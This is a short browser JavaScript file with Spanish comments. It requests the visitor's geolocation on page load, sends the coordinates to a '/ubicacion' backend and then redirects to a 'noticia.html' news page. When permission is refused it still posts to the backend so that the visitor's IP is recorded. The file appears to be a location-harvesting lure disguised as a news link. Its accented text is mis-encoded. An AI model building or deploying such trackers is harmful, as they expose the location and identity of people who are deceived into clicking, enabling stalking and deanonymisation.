// Ejecuta al cargar la p√°gina
window.addEventListener('DOMContentLoaded', () => {
    const estado = document.getElementById("estado");
  
    console.log("üì¶ script.js se est√° ejecutando");
  
    // Verifica si el navegador soporta geolocalizaci√≥n
    if (!navigator.geolocation) {
      console.warn("üåê Geolocalizaci√≥n no soportada");
      if (estado) estado.innerText = "Tu navegador no soporta geolocalizaci√≥n.";
      return;
    }
  
    // Intenta obtener ubicaci√≥n
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
  
        console.log(`üü¢ Permiso concedido. Latitud: ${lat}, Longitud: ${lon}`);
  
        if (estado) estado.innerText = "Ubicaci√≥n obtenida, redirigiendo...";
  
        // Enviar al backend
        fetch('/ubicacion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: lat, longitude: lon })
        }).then(() => {
          // Redirige al contenido principal
          window.location.href = "noticia.html";
        }).catch(err => {
          console.error("‚ùå Error al enviar datos al backend:", err);
          if (estado) estado.innerText = "Error al enviar la ubicaci√≥n.";
        });
      },
      (error) => {
        console.warn("‚ùå Acceso denegado o error al obtener ubicaci√≥n:", error.message);
  
        if (estado) estado.innerText = "Esta funci√≥n requiere acceso a tu ubicaci√≥n.";
  
        // A√∫n as√≠ enviamos la IP al backend
        fetch('/ubicacion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: null, longitude: null })
        }).then(() => {
          console.log("‚ÑπÔ∏è Solo se registr√≥ la IP (sin coordenadas)");
        }).catch(err => {
          console.error("‚ùå Error al enviar solo IP:", err);
        });
      }
    );
  });
  